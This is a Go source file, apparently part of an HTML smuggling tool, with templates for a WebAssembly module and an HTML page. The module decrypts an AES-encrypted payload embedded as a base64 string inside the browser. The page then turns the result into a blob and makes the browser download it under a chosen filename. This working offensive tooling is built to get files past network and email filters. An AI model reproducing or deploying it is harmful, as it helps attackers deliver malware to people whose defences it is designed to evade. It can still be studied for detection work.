package smuggle

type htmldata struct {
	FunctionName string
	OutputFile   string
	WasmFileName string
}

const smuggleMain = `package main

import (
	"crypto/cipher"
	"crypto/aes"
	"encoding/base64"
	"syscall/js"
)

func pkcs5Trimming(encrypt []byte) []byte {
	padding := encrypt[len(encrypt)-1]
	return encrypt[:len(encrypt)-int(padding)]
}

func aesDecrypt(key string, buf string) ([]byte, error) {

	encKey, err := base64.StdEncoding.DecodeString(key)
	if err != nil {
		return nil, err
	}

	encBuf, err := base64.StdEncoding.DecodeString(buf)
	if err != nil {
		return nil, err
	}

	var block cipher.Block

	block, err = aes.NewCipher(encKey)
	if err != nil {
		return nil, err
	}

	if len(encBuf) < aes.BlockSize {

		return nil, nil
	}
	iv := encBuf[:aes.BlockSize]
	encBuf = encBuf[aes.BlockSize:]

	cbc := cipher.NewCBCDecrypter(block, iv)
	cbc.CryptBlocks(encBuf, encBuf)
	decBuf := pkcs5Trimming(encBuf)

	return decBuf, nil

}





func {{.FunctionName}}(this js.Value, args []js.Value) interface{}  {

	bufstring := "{{.BufStr}}"
	kstring := "{{.KeyStr}}"

	imgbuf, err := aesDecrypt(kstring, bufstring)
	if err != nil {
		return nil
	}

	arrayConstructor := js.Global().Get("Uint8Array")
	dataJS := arrayConstructor.New(len(imgbuf))

	js.CopyBytesToJS(dataJS, imgbuf)


	return dataJS
}

func main() {
	js.Global().Set("{{.FunctionName}}", js.FuncOf({{.FunctionName}}))
	<-make(chan bool)// keep running
}

`

const htmlExample = `
<!DOCTYPE html>
<html>
<head>
<script src="wasm_exec.js"></script>
<script>
	const go = new Go();
	//Modify to your WASM filename.
	WebAssembly.instantiateStreaming(fetch("{{.WasmFileName}}"), go.importObject).then((result) => {
		go.run(result.instance);
	});
	function compImage() {
		buffer = {{.FunctionName}}();
        var mrblobby = new Blob([buffer]);
		var blobUrl=URL.createObjectURL(mrblobby);
        document.getElementById("prr").hidden = !0; //div tag used for download

		userAction.href=blobUrl;
		userAction.download="{{.OutputFile}}"; //modify to your desired filename.
		userAction.click();
	}
</script>
</head>
<body>
    <button onClick="compImage()">goSmuggle</button>
    <div id="prr"><a id=userAction hidden><button></button></a></div>
</body>
</html>
`
